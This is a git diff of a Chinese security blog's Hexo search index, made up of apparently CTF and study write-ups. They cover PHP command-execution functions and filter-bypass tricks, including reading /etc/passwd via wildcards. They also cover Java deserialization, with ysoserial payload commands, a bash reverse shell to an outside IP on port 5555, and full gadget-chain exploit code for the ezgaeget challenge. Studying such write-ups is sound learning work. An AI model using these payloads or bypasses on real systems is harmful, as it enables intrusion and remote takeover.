-<h5 id="2-exec函数"><a href="#2-exec函数" class="headerlink" title="2.exec函数"></a>2.exec函数</h5><p>用于执行一个外部程序, 并不会自动输出,需要加echo</p>
-<p>echo exec(‘whoami’)</p>
-<p>root</p>
-<h5 id="3-shell-exec函数"><a href="#3-shell-exec函数" class="headerlink" title="3.shell_exec函数"></a>3.shell_exec函数</h5><p>通过shell环境执行命令,并且将完整的输出以字符串的方式返回,不会自动输出,需要加echo</p>
-<p>echo shell_exec(‘whoami’)</p>
-<p>root</p>
-<h5 id="4-passthru函数"><a href="#4-passthru函数" class="headerlink" title="4.passthru函数"></a>4.passthru函数</h5><p>用于执行外部程序并且显示原始输出</p>
-<p>passthru(‘whoami’)</p>
-<p>root</p>
-<h5 id="5-popen函数"><a href="#5-popen函数" class="headerlink" title="5.popen函数"></a>5.popen函数</h5><p>popen函数用于打开进程文件指针,用法如下:</p>
-<p>resource.popen(string $command,string $mode)</p>
-<p>例如</p>
-<p>popen(“touch test.txt”,”r”);执行该代码后,会在当前目录下创建text.txt文件</p>
-<h5 id="6-proc-popen"><a href="#6-proc-popen" class="headerlink" title="6.proc_popen"></a>6.proc_popen</h5><p>用于执行一个命令,并且打开用来输入输出的文件指针.大概相当于popen的数组版</p>
-<h5 id="7-反单引号"><a href="#7-反单引号" class="headerlink" title="7.反单引号"></a>7.反单引号</h5><p>反单引号是PHP执行运算符,PHP将尝试将返单引号中的内容作为shell命令来执行,并将其输出信息返回</p>
-<p>例如</p>
-<p>echo `whoami`;</p>
-<p>root</p>
-<h4 id="Windows下的命令连接符"><a href="#Windows下的命令连接符" class="headerlink" title="Windows下的命令连接符"></a>Windows下的命令连接符</h4><h5 id="1-amp-命令连接符"><a href="#1-amp-命令连接符" class="headerlink" title="1)&amp;命令连接符"></a>1)&amp;命令连接符</h5><p>&amp;前面的语句为假,则直接执行&amp;后面的语句,&amp;前面的语句为真,则&amp;前后的语句都执行</p>
-<h5 id="2-amp-amp-命令连接符"><a href="#2-amp-amp-命令连接符" class="headerlink" title="2)&amp;&amp;命令连接符"></a>2)&amp;&amp;命令连接符</h5><p>&amp;&amp;前面的语句为假,则直接报错,&amp;&amp;后面的语句也不执行</p>
-<h5 id="3-命令连接符"><a href="#3-命令连接符" class="headerlink" title="3)|命令连接符"></a>3)|命令连接符</h5><p>|前面的语句为假,则直接报错,|后面的语句也不执行;</p>
-<p>|前面的语句为真,则执行|后面的语句</p>
-<h5 id="4-命令连接符"><a href="#4-命令连接符" class="headerlink" title="4)||命令连接符"></a>4)||命令连接符</h5><p>||前面的语句为假,则执行||后面的语句;</p>
-<p>||前面的语句为真,则只执行||前面的语句,不执行||后面的语句</p>
-<h4 id="linux下的命令连接符"><a href="#linux下的命令连接符" class="headerlink" title="linux下的命令连接符"></a>linux下的命令连接符</h4><h5 id="1-命令连接符"><a href="#1-命令连接符" class="headerlink" title="1);命令连接符"></a>1);命令连接符</h5><p>;使多个命令顺序执行,前面的命令和后面的命令都会执行</p>
-<h5 id="2-amp-命令连接符"><a href="#2-amp-命令连接符" class="headerlink" title="2)&amp;命令连接符"></a>2)&amp;命令连接符</h5><p>&amp;的作用是使命令在后台运行,这样就可以同时执行多条命令</p>
-<p>id&amp;whoami前后命令都会执行</p>
-<h5 id="3-amp-amp-命令连接符"><a href="#3-amp-amp-命令连接符" class="headerlink" title="3)&amp;&amp;命令连接符"></a>3)&amp;&amp;命令连接符</h5><p>&amp;&amp;的作用是:如果前面的命令执行成功,则执行后面的命令</p>
-<h5 id="4-命令连接符-管道符"><a href="#4-命令连接符-管道符" class="headerlink" title="4)|命令连接符(管道符)"></a>4)|命令连接符(管道符)</h5><p>|的作用是:将前面的命令的输出作为后面的命令的输入,前面的命令和后面的命令都会执行,但是只显示后面的命令的执行效果.</p>
-<h5 id="5-命令连接符"><a href="#5-命令连接符" class="headerlink" title="5||命令连接符"></a>5||命令连接符</h5><p>类似于if-else语句,前面执行后面不执行,前面执行失败后面执行</p>
-<h3 id="命令执行绕过"><a href="#命令执行绕过" class="headerlink" title="命令执行绕过"></a>命令执行绕过</h3><h4 id="1-绕过空格过滤"><a href="#1-绕过空格过滤" class="headerlink" title="1.绕过空格过滤"></a>1.绕过空格过滤</h4><h5 id="1-IFS-绕过"><a href="#1-IFS-绕过" class="headerlink" title="1)${IFS}绕过"></a>1)${IFS}绕过</h5><p>$IFS是shell的特殊环境变量,是linux下的内部域分隔符.${IFS}中存储的值可以是空格/制表符/换行符或者其他自定义符号</p>
-<h5 id="2-IFS-9绕过"><a href="#2-IFS-9绕过" class="headerlink" title="2)$IFS$9绕过"></a>2)$IFS$9绕过</h5><h5 id="3-制表符绕过"><a href="#3-制表符绕过" class="headerlink" title="3)制表符绕过"></a>3)制表符绕过</h5><p>%09是制表符的url编码,可以通过%09来代替空格,绕过空格过滤</p>
-<h5 id="4-绕过"><a href="#4-绕过" class="headerlink" title="4){ }绕过"></a>4){ }绕过</h5><p>空格过滤可以用{ }绕过,例如</p>
-<p>{cat,index.php}</p>
-<h5 id="5-lt-绕过"><a href="#5-lt-绕过" class="headerlink" title="5)&lt;绕过"></a>5)&lt;绕过</h5><p>例如cat&lt;index.php</p>
-<h4 id="2-绕过关键字过滤"><a href="#2-绕过关键字过滤" class="headerlink" title="2.绕过关键字过滤"></a>2.绕过关键字过滤</h4><p><strong>利用反引号绕过``包裹的内容在php中会被当成系统命令执行</strong></p>
-<h5 id="1-变量拼接绕过"><a href="#1-变量拼接绕过" class="headerlink" title="1)变量拼接绕过"></a>1)变量拼接绕过</h5><p>linux支持变量赋值,可以通过变量拼接来绕过过滤规则</p>
-<p>例如</p>
-<p>$a=c;$b=at;$a$b index.php</p>
-<h5 id="2-空变量绕过"><a href="#2-空变量绕过" class="headerlink" title="2)空变量绕过"></a>2)空变量绕过</h5><p>例如,可以通过空变量绕过cat命令过滤</p>
-<p>ca${x}t index.php</p>
-<h5 id="3-系统变量绕过"><a href="#3-系统变量绕过" class="headerlink" title="3)系统变量绕过"></a>3)系统变量绕过</h5><p>${SHELLOPTS}是系统变量,可以利用系统变量的字符拼接绕过过滤</p>
-<h5 id="4-绕过-1"><a href="#4-绕过-1" class="headerlink" title="4)\绕过"></a>4)\绕过</h5><p>可以通过c\a\t index.php绕过cat命令过滤</p>
-<h5 id="5-通配符绕过-简单正则"><a href="#5-通配符绕过-简单正则" class="headerlink" title="5)通配符绕过(简单正则)"></a>5)通配符绕过(简单正则)</h5><p>linux支持利用通配符进行字符匹配.通配符的作用是在模糊查询时表示文件名中某些不确定的字符</p>
-<p>通配符规则如下:</p>
-<ul>
-<li>*表示0到多个任意字符</li>
-<li>?代表一个任意字符</li>
-<li>[ ]内为字符范围,代表该字符范围中的任意一个字符</li>
-</ul>
-<p>例如对于/etc/passwd可以使用/???/???sw?来绕过</p>
-<h5 id="6-shell反弹绕过"><a href="#6-shell反弹绕过" class="headerlink" title="6)shell反弹绕过"></a>6)shell反弹绕过</h5><h5 id="7-Base64编码绕过"><a href="#7-Base64编码绕过" class="headerlink" title="7)Base64编码绕过"></a>7)Base64编码绕过</h5><p>利用系统函数base64对命令进行base64编码,以绕过过滤,例如,id命令的base64编码为aWQ=,再利用base64 -d对aWQ=进行解码,就绕过了过滤</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;aWQ=&quot;|base64 -d</span><br></pre></td></tr></table></figure>
-
-<p>原理:利用echo和管道符向base64输入aWQ=,然后由base64 -d解码为id,再因外面包裹的``反引号,将id当命令执行</p>
-<h5 id="8-利用expr和awk绕过"><a href="#8-利用expr和awk绕过" class="headerlink" title="8)利用expr和awk绕过"></a>8)利用expr和awk绕过</h5><p>通过expr和awk命令从其他的文件中获取字符并进行命令构造</p>
-<p>例如</p>
-<h5 id="9-无回显的命令执行如果存在命令执行漏洞-但是没有回显-可以通过shell反弹的方式将shell反弹到vps上-然后通过vps执行命令-如果无法反弹shell-也可以通过-DNS管道解析的方式获取命令的执行结果"><a href="#9-无回显的命令执行如果存在命令执行漏洞-但是没有回显-可以通过shell反弹的方式将shell反弹到vps上-然后通过vps执行命令-如果无法反弹shell-也可以通过-DNS管道解析的方式获取命令的执行结果" class="headerlink" title="9)无回显的命令执行如果存在命令执行漏洞,但是没有回显,可以通过shell反弹的方式将shell反弹到vps上,然后通过vps执行命令.如果无法反弹shell,也可以通过 DNS管道解析的方式获取命令的执行结果"></a>9)无回显的命令执行如果存在命令执行漏洞,但是没有回显,可以通过shell反弹的方式将shell反弹到vps上,然后通过vps执行命令.如果无法反弹shell,也可以通过 DNS管道解析的方式获取命令的执行结果</h5>]]></content>
-      <categories>
-        <category>web</category>
-      </categories>
-      <tags>
-        <tag>php</tag>
-        <tag>RCE</tag>
       </tags>
   </entry>
   <entry>
@@ -4178,7 +3908,7 @@
     <content><![CDATA[<p>实验环境</p>
 <p>jdk8u65</p>
 <p>commonsCollections 3.2.1</p>
-<p>这个学的很吃力,但是每天都坚持,争取一周之内将其理解</p>
+<p>这个学的很吃力,但是每天都坚持,争取一周之内将其理解<span id="more"></span></p>
 <hr>
 <blockquote>
 <p>对于InvokerTransformer的理解,在这里记录一下,防止忘记</p>
@@ -4354,7 +4084,8 @@
     <url>/2022/03/09/java%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</url>
     <content><![CDATA[<p>java代码调试环境配置</p>
 <p>首先需要有对应版本的jdk文件,由于windows上的jdk都是exe,所以可以让它安装到虚拟机里面,再把安装的jdk文件夹拷贝出来</p>
-<p>接着去下载对应的openjdk</p>
+<p>然后去下载对应版本的openjdk</p>
+<p>参照这篇文章进行操作<a href="https://www.cnblogs.com/haimishasha/p/9909055.html">https://www.cnblogs.com/haimishasha/p/9909055.html</a></p>
 <p>解压jdk中的src压缩包</p>
 <p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220311225711001.png" alt="image-20220311225711001"></p>
 <p>将<code>openjdk</code>中<code>src\share\classes</code>目录下的sun文件夹复制到<code>jdk</code>src目录中</p>
@@ -4365,30 +4096,6 @@
       <categories>
         <category>java</category>
       </categories>
-  </entry>
-  <entry>
-    <title>周题</title>
-    <url>/2022/03/18/%E5%91%A8%E9%A2%98/</url>
-    <content><![CDATA[<h3 id="ezgaeget（东华杯）"><a href="#ezgaeget（东华杯）" class="headerlink" title="ezgaeget（东华杯）"></a>ezgaeget（东华杯）</h3><p>本题是一道关于java反序列化的题目</p>
-<p>题目有一个jar包,通过Java Decompiler打开,查看里面的类,发现一个类ToStringBean,它的toString方法不但能从字节码加载类,并且还能帮助类继续实例化,所以这就是代码执行的地方了,想办法将ClassByte换成恶意类的字节码即可</p>
-<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220318151601653.png" alt="image-20220318151601653"></p>
-<p>并且在IndexController这个Controller类中发现了能进行反序列化的地方</p>
-<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220318151834640.png" alt="image-20220318151834640"></p>
-<p>java中ObjectInputStream.readObject其实就是反序列化的方法</p>
-<p>所以现在思路确定下来,首先构造恶意类,让其中的readObject可以调用参数的toString方法</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//首先通过字节码获取对应类的字节码</span></span><br><span class="line">        <span class="keyword">byte</span>[] bytes= Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\javaSecurity\\cc\\target\\test-classes\\test.class&quot;</span>));</span><br><span class="line">        ToStringBean toStringBean = <span class="keyword">new</span> ToStringBean();</span><br><span class="line">        Class&lt;? extends ToStringBean&gt; toStringBeanClass = toStringBean.getClass();</span><br><span class="line">        Field classByte = toStringBeanClass.getDeclaredField(<span class="string">&quot;ClassByte&quot;</span>);</span><br><span class="line">        classByte.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        classByte.set(toStringBean,bytes);</span><br><span class="line">        <span class="comment">//现在代码执行的地方已经封装好了,接下来就是构造反序列化时候能调用toString,恰好BadAttributeValueExpException的readObject会调用toString</span></span><br><span class="line"></span><br><span class="line">        BadAttributeValueExpException badAttributeValueExpException = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line">        <span class="comment">//此处有个坑,就是BadAttributeValueExpException的构造方法会先执行toString,所以通过反射在实例化后再次修改</span></span><br><span class="line">        Class&lt;? extends BadAttributeValueExpException&gt; badAttributeValueExpExceptionClass = badAttributeValueExpException.getClass();</span><br><span class="line">        Field val = badAttributeValueExpExceptionClass.getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        val.set(badAttributeValueExpException,toStringBean);</span><br><span class="line">        <span class="comment">//构造完成,接下来只需要构造base64编码的字节流</span></span><br><span class="line">        </span><br><span class="line">        ByteOutputStream byteOutputStream=<span class="keyword">new</span> ByteOutputStream();</span><br><span class="line">        ObjectOutputStream objectOutputStream=<span class="keyword">new</span> ObjectOutputStream(byteOutputStream);</span><br><span class="line">        objectOutputStream.writeUTF(<span class="string">&quot;gadgets&quot;</span>);</span><br><span class="line">        objectOutputStream.writeInt(<span class="number">2021</span>);</span><br><span class="line">        objectOutputStream.writeObject(badAttributeValueExpException);</span><br><span class="line">        <span class="keyword">byte</span>[] bytes1=byteOutputStream.toByteArray();</span><br><span class="line">        </span><br><span class="line">        System.out.println(Tools.base64Encode(bytes1));</span><br><span class="line">       </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<p>起初没有保证序列化之前的包名一致,导致无法正常反序列化,反序列化的时候必须保证反序列化的类所在的包名一样</p>
-<p>还有一个坑点,就是base64在传的时候,记得先urlencode一次,防止将+当成空格去传,但是解码的时候又把空格当成base64来解码,所以会报<code>Illegal base64 character 20</code>错误</p>
-<p>传入data为打印出的字符串,成功执行代码</p>
-]]></content>
-      <categories>
-        <category>ctf</category>
-      </categories>
-      <tags>
-        <tag>java</tag>
-        <tag>ctf</tag>
-      </tags>
   </entry>
   <entry>
     <title>shiro</title>
@@ -4481,7 +4188,7 @@
   <entry>
     <title>7u21</title>
     <url>/2022/03/24/7u21/</url>
-    <content><![CDATA[<p>首先去下载个jdk7u21</p>
+    <content><![CDATA[<p>首先去下载个jdk7u21<span id="more"></span></p>
 <p><a href="https://www.oracle.com/java/technologies/javase/javase7-archive-downloads.html">https://www.oracle.com/java/technologies/javase/javase7-archive-downloads.html</a></p>
 <p>然后去下载对应版本的openjdk</p>
 <p>参照这篇文章进行操作<a href="https://www.cnblogs.com/haimishasha/p/9909055.html">https://www.cnblogs.com/haimishasha/p/9909055.html</a></p>
@@ -4544,11 +4251,16 @@
 <h5 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h5><p>画一个思维导图再加深一下理解</p>
 <p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220325134238553.png" alt="image-20220325134238553"></p>
 ]]></content>
+      <tags>
+        <tag>java</tag>
+      </tags>
   </entry>
   <entry>
     <title>java动态加载字节码</title>
     <url>/2022/03/23/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/</url>
-    <content><![CDATA[<h3 id="什么是java的”字节码”"><a href="#什么是java的”字节码”" class="headerlink" title="什么是java的”字节码”"></a>什么是java的”字节码”</h3><p>严格来说，Java字节码（ByteCode）其实仅仅指的是Java虚拟机执行使用的一类指令，通常被存储 在.class文件中。 </p>
+    <content><![CDATA[<h3 id="什么是java的”字节码”"><a href="#什么是java的”字节码”" class="headerlink" title="什么是java的”字节码”"></a>什么是java的”字节码”</h3><span id="more"></span>
+
+<p>严格来说，Java字节码（ByteCode）其实仅仅指的是Java虚拟机执行使用的一类指令，通常被存储 在.class文件中。 </p>
 <p>众所周知，不同平台、不同CPU的计算机指令有差异，但因为Java是一门跨平台的编译型语言，所以这 些差异对于上层开发者来说是透明的，上层开发者只需要将自己的代码编译一次，即可运行在不同平台 的JVM虚拟机中。</p>
 <p> 甚至，开发者可以用类似Scala、Kotlin这样的语言编写代码，只要你的编译器能够将代码编译成.class文 件，都可以在JVM虚拟机中运行：</p>
 <p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220323213706173.png" alt="image-20220323213706173"></p>
@@ -4585,6 +4297,7 @@
 <h3 id="利用BCEL-ClassLoader加载字节码"><a href="#利用BCEL-ClassLoader加载字节码" class="headerlink" title="利用BCEL ClassLoader加载字节码"></a>利用BCEL ClassLoader加载字节码</h3><p>BCEL的全名应该是Apache Commons BCEL，属于Apache Commons项目下的一个子项目，但其因为 被Apache Xalan所使用，而Apache Xalan又是Java内部对于JAXP的实现，所以BCEL也被包含在了JDK的 原生库中。</p>
 <p>我们可以通过BCEL提供的两个类<code> Repository</code> 和<code>Utility</code>来利用： <code>Repository </code>用于将一个Java Class 先转换成原生字节码，当然这里也可以直接使用javac命令来编译java文件生成字节码； Utility 用于将 原生的字节码转换成BCEL格式的字节码：</p>
 <p>BCEL ClassLoader在Fastjson等漏洞的利用链构造时都有被用到，其实这个类和前面的<code> TemplatesImpl</code> 都出自于同一个第三方库，Apache Xalan。但是由于各种原因，在Java 8u251的更新中，这个ClassLoader被移除了.</p>
+<p>待续…..</p>
 ]]></content>
       <categories>
         <category>java</category>
@@ -4596,7 +4309,12 @@
   <entry>
     <title>java反序列化学习</title>
     <url>/2022/03/06/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/</url>
-    <content><![CDATA[<h3 id="java反序列化"><a href="#java反序列化" class="headerlink" title="java反序列化"></a>java反序列化</h3><p>Java序列化是指把java对象转换为字节序列的过程,而java反序列化是指把字节序列恢复为java对象的过程</p>
+    <content><![CDATA[<h3 id="java反序列化"><a href="#java反序列化" class="headerlink" title="java反序列化"></a>java反序列化</h3><h5 id="反序列化特征"><a href="#反序列化特征" class="headerlink" title="反序列化特征"></a>反序列化特征<span id="more"></span></h5><p>下方的特征可以作为序列化的标志参考:</p>
+<ul>
+<li>一段数据以<code>rO0AB</code>开头，你基本可以确定这串就是Java序列化base64加密的数据。</li>
+<li>或者如果以<code>aced</code>开头，那么他就是这一段Java序列化的16进制。</li>
+</ul>
+<p>Java序列化是指把java对象转换为字节序列的过程,而java反序列化是指把字节序列恢复为java对象的过程</p>
 <p>序列化分将数据分解成字节流,以便存储在文件中或在网络上传输,反序列化就是打开字节流并重构对象,对象序列化不仅要将基本数据类型转换成字节表示,有时还要恢复数据,恢复数据要求有恢复数据的对象实例</p>
 <p>应用场景:</p>
 <p>1.想把内存中的对象保存到一个文件中或者数据库中的时候</p>
@@ -4785,6 +4503,143 @@
       </categories>
       <tags>
         <tag>java反序列化</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>java题目</title>
+    <url>/2022/03/26/java%E9%A2%98%E7%9B%AE/</url>
+    <content><![CDATA[<h2 id="网鼎杯-2020-朱雀组-Think-Java"><a href="#网鼎杯-2020-朱雀组-Think-Java" class="headerlink" title="[网鼎杯 2020 朱雀组]Think Java"></a>[网鼎杯 2020 朱雀组]Think Java</h2><blockquote>
+<p>血的教训</p>
+<p>千万不要用powershell使用ysoserial,生成的payload直接乱码呜呜</p>
+</blockquote>
+<span id="more"></span>
+
+<p>本题起初找不到入口,看的别人的wp做的,也学习到了很多东西</p>
+<p>生成URLDNS payload</p>
+<p><code>java -jar ysoserial.jar URLDNS &quot;http://3s8kl8.dnslog.cn&quot; &gt; url.bin</code></p>
+<p>按照其token规则进行编码</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">r&quot;F:\TOOLS\ser\url.bin&quot;</span>,<span class="string">&quot;rb&quot;</span>)</span><br><span class="line">now = file.read()</span><br><span class="line">ba = base64.b64encode(now)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Bearer &quot;</span>+ba.decode(<span class="string">&#x27;unicode_escape&#x27;</span>))</span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure>
+
+<p>在<code>/common/user/current</code>发送</p>
+<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220326161131867.png" alt="image-20220326161131867"></p>
+<p>dnslog收到请求</p>
+<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220326161147299.png" alt="image-20220326161147299"></p>
+<p><code>bash -i &gt;&amp; /dev/tcp/121.40.113.226/5555 0&gt;&amp;1</code>反弹shell的命令要进行一次转换</p>
+<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220326162201101.png" alt="image-20220326162201101"></p>
+<p>接着生成反弹shell的反序列化字节码文件</p>
+<p><code>java -jar ysoserial.jar ROME &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjEuNDAuMTEzLjIyNi81NTU1IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; &gt; shell.bin</code></p>
+<p>反弹shell尝试了两次才成功</p>
+<h2 id="ezgaeget（东华杯）"><a href="#ezgaeget（东华杯）" class="headerlink" title="ezgaeget（东华杯）"></a>ezgaeget（东华杯）</h2><p>本题是一道关于java反序列化的题目</p>
+<p>题目有一个jar包,通过Java Decompiler打开,查看里面的类,发现一个类ToStringBean,它的toString方法不但能从字节码加载类,并且还能帮助类继续实例化,所以这就是代码执行的地方了,想办法将ClassByte换成恶意类的字节码即可</p>
+<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220318151601653.png" alt="image-20220318151601653"></p>
+<p>并且在IndexController这个Controller类中发现了能进行反序列化的地方</p>
+<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220318151834640.png" alt="image-20220318151834640"></p>
+<p>java中ObjectInputStream.readObject其实就是反序列化的方法</p>
+<p>所以现在思路确定下来,首先构造恶意类,让其中的readObject可以调用参数的toString方法</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//首先通过字节码获取对应类的字节码</span></span><br><span class="line">        <span class="keyword">byte</span>[] bytes= Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\javaSecurity\\cc\\target\\test-classes\\test.class&quot;</span>));</span><br><span class="line">        ToStringBean toStringBean = <span class="keyword">new</span> ToStringBean();</span><br><span class="line">        Class&lt;? extends ToStringBean&gt; toStringBeanClass = toStringBean.getClass();</span><br><span class="line">        Field classByte = toStringBeanClass.getDeclaredField(<span class="string">&quot;ClassByte&quot;</span>);</span><br><span class="line">        classByte.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        classByte.set(toStringBean,bytes);</span><br><span class="line">        <span class="comment">//现在代码执行的地方已经封装好了,接下来就是构造反序列化时候能调用toString,恰好BadAttributeValueExpException的readObject会调用toString</span></span><br><span class="line"></span><br><span class="line">        BadAttributeValueExpException badAttributeValueExpException = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line">        <span class="comment">//此处有个坑,就是BadAttributeValueExpException的构造方法会先执行toString,所以通过反射在实例化后再次修改</span></span><br><span class="line">        Class&lt;? extends BadAttributeValueExpException&gt; badAttributeValueExpExceptionClass = badAttributeValueExpException.getClass();</span><br><span class="line">        Field val = badAttributeValueExpExceptionClass.getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        val.set(badAttributeValueExpException,toStringBean);</span><br><span class="line">        <span class="comment">//构造完成,接下来只需要构造base64编码的字节流</span></span><br><span class="line">        </span><br><span class="line">        ByteOutputStream byteOutputStream=<span class="keyword">new</span> ByteOutputStream();</span><br><span class="line">        ObjectOutputStream objectOutputStream=<span class="keyword">new</span> ObjectOutputStream(byteOutputStream);</span><br><span class="line">        objectOutputStream.writeUTF(<span class="string">&quot;gadgets&quot;</span>);</span><br><span class="line">        objectOutputStream.writeInt(<span class="number">2021</span>);</span><br><span class="line">        objectOutputStream.writeObject(badAttributeValueExpException);</span><br><span class="line">        <span class="keyword">byte</span>[] bytes1=byteOutputStream.toByteArray();</span><br><span class="line">        </span><br><span class="line">        System.out.println(Tools.base64Encode(bytes1));</span><br><span class="line">       </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>起初没有保证序列化之前的包名一致,导致无法正常反序列化,反序列化的时候必须保证反序列化的类所在的包名一样</p>
+<p>还有一个坑点,就是base64在传的时候,记得先urlencode一次,防止将+当成空格去传,但是解码的时候又把空格当成base64来解码,所以会报<code>Illegal base64 character 20</code>错误</p>
+<p>传入data为打印出的字符串,成功执行代码</p>
+]]></content>
+      <tags>
+        <tag>java</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>php命令执行小总结</title>
+    <url>/2022/01/08/php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%B0%8F%E6%80%BB%E7%BB%93/</url>
+    <content><![CDATA[<h3 id="PHP常见的命令执行函数和运算符"><a href="#PHP常见的命令执行函数和运算符" class="headerlink" title="PHP常见的命令执行函数和运算符"></a>PHP常见的命令执行函数和运算符<span id="more"></span></h3><h5 id="1-system-函数"><a href="#1-system-函数" class="headerlink" title="1.system()函数"></a>1.system()函数</h5><p>用于执行外部程序,并且显示输出</p>
+<p>system(‘whoami’)</p>
+<p>root</p>
+<h5 id="2-exec函数"><a href="#2-exec函数" class="headerlink" title="2.exec函数"></a>2.exec函数</h5><p>用于执行一个外部程序, 并不会自动输出,需要加echo</p>
+<p>echo exec(‘whoami’)</p>
+<p>root</p>
+<h5 id="3-shell-exec函数"><a href="#3-shell-exec函数" class="headerlink" title="3.shell_exec函数"></a>3.shell_exec函数</h5><p>通过shell环境执行命令,并且将完整的输出以字符串的方式返回,不会自动输出,需要加echo</p>
+<p>echo shell_exec(‘whoami’)</p>
+<p>root</p>
+<h5 id="4-passthru函数"><a href="#4-passthru函数" class="headerlink" title="4.passthru函数"></a>4.passthru函数</h5><p>用于执行外部程序并且显示原始输出</p>
+<p>passthru(‘whoami’)</p>
+<p>root</p>
+<h5 id="5-popen函数"><a href="#5-popen函数" class="headerlink" title="5.popen函数"></a>5.popen函数</h5><p>popen函数用于打开进程文件指针,用法如下:</p>
+<p>resource.popen(string $command,string $mode)</p>
+<p>例如</p>
+<p>popen(“touch test.txt”,”r”);执行该代码后,会在当前目录下创建text.txt文件</p>
+<h5 id="6-proc-popen"><a href="#6-proc-popen" class="headerlink" title="6.proc_popen"></a>6.proc_popen</h5><p>用于执行一个命令,并且打开用来输入输出的文件指针.大概相当于popen的数组版</p>
+<h5 id="7-反单引号"><a href="#7-反单引号" class="headerlink" title="7.反单引号"></a>7.反单引号</h5><p>反单引号是PHP执行运算符,PHP将尝试将返单引号中的内容作为shell命令来执行,并将其输出信息返回</p>
+<p>例如</p>
+<p>echo `whoami`;</p>
+<p>root</p>
+<h4 id="Windows下的命令连接符"><a href="#Windows下的命令连接符" class="headerlink" title="Windows下的命令连接符"></a>Windows下的命令连接符</h4><h5 id="1-amp-命令连接符"><a href="#1-amp-命令连接符" class="headerlink" title="1)&amp;命令连接符"></a>1)&amp;命令连接符</h5><p>&amp;前面的语句为假,则直接执行&amp;后面的语句,&amp;前面的语句为真,则&amp;前后的语句都执行</p>
+<h5 id="2-amp-amp-命令连接符"><a href="#2-amp-amp-命令连接符" class="headerlink" title="2)&amp;&amp;命令连接符"></a>2)&amp;&amp;命令连接符</h5><p>&amp;&amp;前面的语句为假,则直接报错,&amp;&amp;后面的语句也不执行</p>
+<h5 id="3-命令连接符"><a href="#3-命令连接符" class="headerlink" title="3)|命令连接符"></a>3)|命令连接符</h5><p>|前面的语句为假,则直接报错,|后面的语句也不执行;</p>
+<p>|前面的语句为真,则执行|后面的语句</p>
+<h5 id="4-命令连接符"><a href="#4-命令连接符" class="headerlink" title="4)||命令连接符"></a>4)||命令连接符</h5><p>||前面的语句为假,则执行||后面的语句;</p>
+<p>||前面的语句为真,则只执行||前面的语句,不执行||后面的语句</p>
+<h4 id="linux下的命令连接符"><a href="#linux下的命令连接符" class="headerlink" title="linux下的命令连接符"></a>linux下的命令连接符</h4><h5 id="1-命令连接符"><a href="#1-命令连接符" class="headerlink" title="1);命令连接符"></a>1);命令连接符</h5><p>;使多个命令顺序执行,前面的命令和后面的命令都会执行</p>
+<h5 id="2-amp-命令连接符"><a href="#2-amp-命令连接符" class="headerlink" title="2)&amp;命令连接符"></a>2)&amp;命令连接符</h5><p>&amp;的作用是使命令在后台运行,这样就可以同时执行多条命令</p>
+<p>id&amp;whoami前后命令都会执行</p>
+<h5 id="3-amp-amp-命令连接符"><a href="#3-amp-amp-命令连接符" class="headerlink" title="3)&amp;&amp;命令连接符"></a>3)&amp;&amp;命令连接符</h5><p>&amp;&amp;的作用是:如果前面的命令执行成功,则执行后面的命令</p>
+<h5 id="4-命令连接符-管道符"><a href="#4-命令连接符-管道符" class="headerlink" title="4)|命令连接符(管道符)"></a>4)|命令连接符(管道符)</h5><p>|的作用是:将前面的命令的输出作为后面的命令的输入,前面的命令和后面的命令都会执行,但是只显示后面的命令的执行效果.</p>
